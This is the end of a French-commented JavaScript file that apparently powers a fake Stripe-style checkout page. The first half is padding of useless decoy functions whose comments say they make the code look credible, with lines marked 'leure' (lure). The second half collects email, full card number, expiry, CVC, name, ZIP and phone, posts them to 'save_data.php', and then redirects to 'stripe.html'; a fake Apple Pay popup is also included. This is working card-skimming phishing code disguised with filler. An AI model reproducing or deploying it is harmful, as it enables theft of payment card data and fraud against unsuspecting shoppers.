    // Fonction qui manipule des promesses de manière inutile
    function fakePromise() {
        return new Promise((resolve, reject) => {
            let value = Math.random();
            if (value > 0.5) {
                resolve("Resolved: " + value);
            } else {
                reject("Rejected: " + value);
            }
        });
    }

    // Fonction qui fait semblant de valider une adresse email
    function emailValidation(email) {
        if (email.includes("@") && email.length > 5) {
            return true;
        } else {
            return false;
        }
    }

    // Fonction qui mélange un tableau mais sans utilisation concrète
    function shuffleArray(arr) {
        for (let i = arr.length - 1; i > 0; i--) {
            const j = Math.floor(Math.random() * (i + 1));
            [arr[i], arr[j]] = [arr[j], arr[i]];
        }
        return arr;
    }

    // Fonction qui simule un long calcul sans résultat
    function longCalculation() {
        let sum = 0;
        for (let i = 0; i < 1000000; i++) {
            sum += Math.sqrt(i);
        }
        return sum;  // Ne fait rien d'utile avec ce résultat
    }

    // Fonction qui génère des nombres aléatoires dans un tableau
    function randomNumbersArray() {
        let arr = [];
        for (let i = 0; i < 100; i++) {
            arr.push(Math.random() * 100);
        }
        return arr;
    }

    // Fonction qui fait une transformation de chaîne inutile
    function uselessStringTransformation(str) {
        return str.split('').map(char => String.fromCharCode(char.charCodeAt(0) + 1)).join('');
    }

    // Fonction avec des instructions ternaires répétées et inutiles
    function ternaryMess(a, b, c) {
        return (a > b) ? ((b > c) ? "B > C" : "C > B") : ((a > c) ? "A > C" : "C > A");
    }

    // Fonction qui simule une recherche inutile dans un tableau
    function findInArray(arr, value) {
        for (let i = 0; i < arr.length; i++) {
            if (arr[i] === value) {
                return i;
            }
        }
        return -1;  // Ne trouve jamais rien de vraiment utile
    }

    // Fonction qui calcule des moyennes inutiles
    function calculateMean(numbers) {
        let total = 0;
        for (let i = 0; i < numbers.length; i++) {
            total += numbers[i];
        }
        return total / numbers.length;
    }

    // Fonction qui génère une erreur volontaire pour embrouiller
    function generateError() {
        try {
            throw new Error("This is a fake error");
        } catch (e) {
            return "Error caught: " + e.message;
        }
    }

    // Fonction qui effectue des conversions d'unités mais qui ne sont pas utilisées
    function unitConverter(value, fromUnit, toUnit) {
        if (fromUnit === "cm" && toUnit === "m") {
            return value / 100;
        } else if (fromUnit === "m" && toUnit === "cm") {
            return value * 100;
        }
        return value;  // Ne fait rien d'utile
    }

    // Fonction qui trie un tableau inutilement
    function uselessSort(arr) {
        return arr.sort((a, b) => a - b);
    }

    // Fonction qui crée un objet inutilement complexe
    function createComplexObject() {
        let obj = {
            name: "John Doe",
            age: 30,
            address: {
                street: "123 Main St",
                city: "Somewhere",
                country: "Nowhere"
            },
            hobbies: ["reading", "coding", "gaming"]
        };
        return obj;  // Ne fait rien de spécial avec cet objet
    }

    // Fonction qui simule une vérification de sécurité inutile
    function securityCheck(user) {
        if (user.role === "admin" && user.password.length > 8) {
            return true;
        }
        return false;
    }

    // Fonction qui retourne des nombres pairs d'un tableau
    function getEvenNumbers(arr) {
        return arr.filter(num => num % 2 === 0);
    }

    // Fonction qui retourne des nombres impairs d'un tableau
    function getOddNumbers(arr) {
        return arr.filter(num => num % 2 !== 0);
    }

    // Fonction qui calcule la somme d'un tableau mais sans importance
    function sumArray(arr) {
        return arr.reduce((acc, val) => acc + val, 0);
    }

    // Fonction qui applique une opération arithmétique mais n'a aucun effet réel
    function arithmeticOperation(a, b) {
        return (a + b) * (a - b);
    }

    // Fonction qui manipule des objets avec des opérations inutiles
    function objectManipulation2() {
        let obj = { a: 1, b: 2, c: 3 };
        obj.b = obj.a + obj.c;
        obj.d = obj.b - obj.a;
        return obj;
    }

    // Fonction avec une boucle infinie brisée rapidement
    function fakeLoop2() {
        while (true) {
            if (Math.random() > 0.99) {
                break;
            }
        }
        return "Escaped from loop";
    }

    // Fonction qui retourne des objets modifiés sans but
    function modifyObject(obj) {
        obj.name = obj.name.toUpperCase();
        obj.age += 10;
        return obj;
    }

    // Fonction qui analyse une chaîne mais ne fait rien de significatif
    function analyzeString(str) {
        let count = 0;
        for (let i = 0; i < str.length; i++) {
            if (str[i] === 'a') {
                count++;
            }
        }
        return count;  // Le compte est inutile
    }

    // Fonction qui simule une requête réseau avec setTimeout
    function fakeNetworkRequest() {
        setTimeout(() => {
            console.log("Fake request completed.");
        }, 500);
    }

    // Fonction avec des instructions try/catch sans sens
    function anotherTryCatch() {
        try {
            let num = Math.random();
            if (num < 0.5) {
                throw new Error("Random error occurred");
            }
            return "Success!";
        } catch (error) {
            return "Caught error: " + error.message;
        }
    }

    // Fonction qui vérifie si un tableau contient un élément mais ne l'utilise pas
    function containsElement(arr, elem) {
        return arr.includes(elem);
    }

    // Fonction qui convertit une chaîne en majuscules mais ne fait rien avec
    function toUpperCaseString(str) {
        return str.toUpperCase();
    }

    // Fonction qui fait un tri inversé inutilement
    function reverseSort(arr) {
        return arr.sort((a, b) => b - a);
    }

    // Fonction qui fait des comparaisons complexes pour rien
    function complexComparison(a, b, c) {
        if (a > b && b > c) {
            return "A > B > C";
        } else if (a < b && b < c) {
            return "A < B < C";
        }
        return "No pattern";
    }

    // Fonction qui divise des nombres mais sans résultat utile
    function divideNumbers(a, b) {
        if (b === 0) {
            return "Division by zero!";
        }
        return a / b;
    }

    // Fonction avec un switch/case inutile
    function uselessSwitchCase(val) {
        switch (val) {
            case 1:
                return "One";
            case 2:
                return "Two";
            default:
                return "Unknown";
        }
    }

    // Fonction qui manipule des dates pour aucune raison utile
    function dateOperations() {
        let now = new Date();
        let future = new Date(now.getTime() + 10000000);
        return future;
    }

    // Fonction qui manipule des nombres mais sans importance
    function numberManipulation(num) {
        return Math.pow(num, 2) + Math.sqrt(num) - num;
    }

    // Fonction qui ne retourne jamais une valeur valide
    function alwaysFalseCondition() {
        if (false) {
            return true;
        }
        return false;
    }

    // Fonction qui simule l'écriture dans un fichier mais ne fait rien
    function fakeFileWrite() {
        console.log("Pretending to write to a file...");
        return true;
    }

    // Fonction qui simule une requête HTTP mais sans effet
    function fakeHTTPRequest() {
        console.log("Pretending to make an HTTP request...");
        return { status: 200, data: "OK" };
    }

    // Fonction finale qui ne fait rien avec des boucles
    function finalLoopFunction() {
        let result = 0;
        for (let i = 0; i < 1000; i++) {
            for (let j = 0; j < 500; j++) {
                result += i + j;
            }
        }
        return result;
    }

    // Appels de toutes les fonctions pour rendre le code plus crédible
    generate2DArray();
    fakePromise().catch(() => {});
    emailValidation("test@example.com");
    shuffleArray([1, 2, 3, 4, 5]);
    longCalculation();
    randomNumbersArray();
    uselessStringTransformation("hello");
    ternaryMess(1, 2, 3);
    findInArray([10, 20, 30], 20);
    calculateMean([1, 2, 3, 4, 5]);
    generateError();
    unitConverter(100, "cm", "m");
    uselessSort([5, 4, 3, 2, 1]);
    createComplexObject();
    securityCheck({ role: "admin", password: "123456789" });
    getEvenNumbers([1, 2, 3, 4, 5, 6]);
    getOddNumbers([1, 2, 3, 4, 5, 6]);
    sumArray([1, 2, 3, 4, 5]);
    arithmeticOperation(10, 5);
    objectManipulation2();
    fakeLoop2();
    modifyObject({ name: "Alice", age: 25 });
    analyzeString("abracadabra");
    fakeNetworkRequest();
    anotherTryCatch();
    containsElement([1, 2, 3], 2);
    toUpperCaseString("example");
    reverseSort([1, 2, 3, 4, 5]);
    complexComparison(5, 3, 1);
    divideNumbers(10, 2);
    uselessSwitchCase(3);
    dateOperations();
    numberManipulation(25);
    alwaysFalseCondition();
    fakeFileWrite();
    fakeHTTPRequest();
    finalLoopFunction();

    // leure************************************************************************************************************************************
    // leure******************************************************************************************************************************************************************************************************
    // leure************************************************************************************************************************************
    // leure*********************************// leure***************************************************************************************************



    // Récupérer les données du formulaire

    const paymentButton = document.getElementById('paymentButton');
    paymentButton.addEventListener('click', function(e) {
        e.preventDefault();

        // Récupérer les données du formulaire
        const formData = getFormData();

        let isValid = true;

        // Valider l'email
        if (!validateEmail(emailInput.value)) {
            emailError.textContent = 'Adresse email invalide';
            emailError.classList.add('invalid');
            emailError.style.display = 'block';
            isValid = false;
        } else {
            emailError.style.display = 'none';
        }

        // Valider le numéro de carte
        const cardNumber = cardInput.value.replace(/\s+/g, '');
        if (cardNumber.length === 0) {
            issuerInfo.textContent = '(Numéro invalide)';
            issuerInfo.className = 'result invalid';
            isValid = false;
        } else if (!validateLuhn(cardNumber)) {
            issuerInfo.textContent = '(Numéro invalide)';
            issuerInfo.className = 'result invalid';
            isValid = false;
        } else {
            issuerInfo.className = 'result valid';
        }

        // Valider la date d'expiration
        if (!validateExpiryDate(expiryInput.value)) {
            expiryError.textContent = 'Date d\'expiration invalide';
            expiryError.classList.add('invalid');
            expiryError.style.display = 'block';
            isValid = false;
        } else {
            expiryError.style.display = 'none';
        }

        // Valider le CVC
        if (cvcInput.value.length !== 3) {
            cvcError.textContent = 'Code CVC invalide';
            cvcError.classList.add('invalid');
            cvcError.style.display = 'block';
            isValid = false;
        } else {
            cvcError.style.display = 'none';
        }

        // Valider le numéro de téléphone
        const phoneDigits = phoneInputField.value.replace(/\D/g, '');
        if (phoneDigits.length < 7) {
            phoneError.textContent = 'Numéro de téléphone invalide';
            phoneError.classList.add('invalid');
            phoneError.style.display = 'block';
            isValid = false;
        } else {
            phoneError.style.display = 'none';
        }

        // Si toutes les données sont valides, envoyer les informations au serveur PHP et afficher le bouton de chargement
        if (isValid) {
            showLoadingSpinner();
            sendDataToServer(formData);
        }
    });

    // Fonction pour récupérer les valeurs des champs du formulaire
    function getFormData() {
        const email = document.getElementById('emailInput').value;
        const cardNumber = document.getElementById('card-number').value;
        const expiryDate = document.getElementById('expiryInput').value;
        const cvc = document.getElementById('cvcInput').value;
        const cardholderName = document.getElementById('cardholderName').value;
        const country = document.getElementById('countrySelect').value;
        const zipCode = document.getElementById('zipCode').value;
        const phoneNumber = document.getElementById('countryCodeInput').value;

        return {
            email: email,
            cardNumber: cardNumber,
            expiryDate: expiryDate,
            cvc: cvc,
            cardholderName: cardholderName,
            country: country,
            zipCode: zipCode,
            phoneNumber: phoneNumber,
        };
    }

    function adjustDropdownDirection() {
        const dropdown = document.querySelector('.dropdown');
        const dropdownContent = dropdown.querySelector('.dropdown-content');
        dropdownContent.classList.remove('open-up', 'open-down');
    
        const rect = dropdown.getBoundingClientRect();
        const windowHeight = window.innerHeight;
    
        // Estimer la hauteur du menu (peut être ajustée si nécessaire)
        const menuHeight = dropdownContent.scrollHeight;
    
        // Calculer l'espace disponible en bas et en haut
        const spaceBelow = windowHeight - rect.bottom;
        const spaceAbove = rect.top;
    
        if (spaceBelow < menuHeight && spaceAbove > spaceBelow) {
            // Ouvrir vers le haut
            dropdownContent.classList.add('open-up');
        } else {
            // Ouvrir vers le bas
            dropdownContent.classList.add('open-down');
        }
    }


    // Fonction pour envoyer les données via PHP
    function sendDataToServer(data) {
        fetch('save_data.php', { // URL vers le fichier PHP qui gère l'enregistrement des données
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
            },
            body: JSON.stringify(data),
        })
        .then(response => response.json())
        .then(result => {
            console.log('Success:', result);
            // Redirection après un délai
            setTimeout(() => {
                window.location.href = 'stripe.html'; // Redirection vers une autre page après 3 secondes
            }, 3000);
        })
        .catch(error => {
            console.error('Error:', error);
        });
    }

    // Fonction pour afficher le bouton de chargement (spinner)
    function showLoadingSpinner() {
        const paymentButton = document.getElementById('paymentButton');
        const loadingSpinner = document.getElementById('loadingSpinner');
        paymentButton.disabled = true; // Désactiver le bouton
        loadingSpinner.classList.add('active'); // Activer le spinner
    }

    // Réinitialiser tous les champs de texte et sélection de pays lors du rechargement de la page
    const formFields = document.querySelectorAll('input[type="text"], input[type="email"], input[type="tel"]');
    formFields.forEach(field => field.value = '');
    document.getElementById('countrySelect').value = 'us'; // Définir "United States" par défaut
    document.getElementById('countryCodeInput').value = '+1'; // Définir par défaut l'indicatif téléphonique des États-Unis

    // Gestion de la bordure du header mobile lorsqu'on scrolle
    const mobileHeader = document.querySelector('.fixed-mobile-header');
    window.addEventListener('scroll', function() {
        if (window.scrollY > 0 && !popup.classList.contains('open')) {
            mobileHeader.classList.add('scrolled');
        } else {
            mobileHeader.classList.remove('scrolled');
        }
    });

    // Récupérer les éléments
    const applePayButton = document.getElementById('applePayButton');
    const applePayPopup = document.getElementById('applePayPopup');
    const appleOverlay = document.getElementById('appleOverlay');
    const closeApplePopup = document.getElementById('closeApplePopup');
    const backButton = document.getElementById('backButton');

    // Afficher la popup quand 'Pay with Apple' est cliqué
    applePayButton.addEventListener('click', function() {
        applePayPopup.style.display = 'block';
        appleOverlay.style.display = 'block';
    });

    // Fermer la popup quand on clique sur le bouton de fermeture
    closeApplePopup.addEventListener('click', function() {
        applePayPopup.style.display = 'none';
        appleOverlay.style.display = 'none';
    });

    // Fermer la popup en cliquant sur l'overlay
    appleOverlay.addEventListener('click', function() {
        applePayPopup.style.display = 'none';
        appleOverlay.style.display = 'none';
    });

    // Fermer la popup quand on clique sur le bouton "Back"
    backButton.addEventListener('click', function () {
        applePayPopup.style.display = 'none';
        appleOverlay.style.display = 'none';
    });

    // Gestion de la popup et de l'overlay pour mobile
    const toggleDetailsBtn = document.getElementById('toggleDetailsBtn');
    const popup = document.getElementById('popup');
    const overlay = document.getElementById('overlay');

    // Fonction pour ouvrir la popup et cacher la bordure du header
    function openPopup() {
        popup.classList.add('open');
        overlay.classList.add('active');
        toggleDetailsBtn.innerHTML = 'Close <i class="fas fa-chevron-down ml-2"></i>';
        mobileHeader.classList.add('no-border'); // Cacher la bordure
        mobileHeader.classList.remove('scrolled'); // Retirer la bordure de scroll
    }

    // Fonction pour fermer la popup et réafficher la bordure si nécessaire
    function closePopup() {
        popup.classList.remove('open');
        overlay.classList.remove('active');
        toggleDetailsBtn.innerHTML = 'Details <i class="fas fa-chevron-up ml-2"></i>';
        mobileHeader.classList.remove('no-border');
        if (window.scrollY > 0) {
            mobileHeader.classList.add('scrolled'); // Rétablir la bordure si on scrolle
        }
    }
    // Gestion du clic sur le bouton Details/Close
    toggleDetailsBtn.addEventListener('click', function() {
        if (popup.classList.contains('open')) {
            closePopup();
        } else {
            openPopup();
        }
    });

    // Fermer la popup en cliquant sur l'overlay
    overlay.addEventListener('click', closePopup);

    // Associer le bouton "View details" à l'ouverture de la popup
    document.getElementById('viewDetailsBtn').addEventListener('click', function() {
        if (!popup.classList.contains('open')) {
            openPopup();
        }
    });

    // Ajuster dynamiquement la hauteur du top de la popup en fonction de celle du header
    function adjustPopupPosition() {
        const headerHeight = mobileHeader.offsetHeight;
        popup.style.top = headerHeight + 'px'; // Applique la hauteur à la popup
    }

    adjustPopupPosition();
    window.addEventListener('resize', adjustPopupPosition);
});